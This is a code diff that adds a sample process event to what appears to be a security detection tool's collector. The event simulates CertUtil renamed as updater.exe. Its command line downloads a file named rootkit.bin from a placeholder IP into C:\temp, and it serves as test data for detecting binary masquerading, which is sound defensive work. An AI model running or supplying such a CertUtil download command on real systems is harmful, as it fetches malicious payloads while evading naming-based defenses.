@@ -271,6 +271,19 @@ class ProcessCollector:
                 integrity_level="High",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
+            # 9. Binary Masquerading (Renamed LOLBin): CertUtil disguised as updater.exe
+            ProcessEvent(
+                pid=8300,
+                ppid=8000,
+                image=r"C:\Users\Public\updater.exe",
+                command_line=r"updater.exe -urlcache -split -f http://198.51.100.42/rootkit.bin C:\temp\rootkit.bin",
+                user=r"WORKSTATION\StandardUser",
+                parent_image=r"C:\Windows\System32\cmd.exe",
+                integrity_level="Medium",
+                original_file_name="CertUtil.exe",
+                hashes={"SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
+                creation_time=datetime.now(timezone.utc).isoformat(),
+            ),
         ]
 
         for event in sample_events:
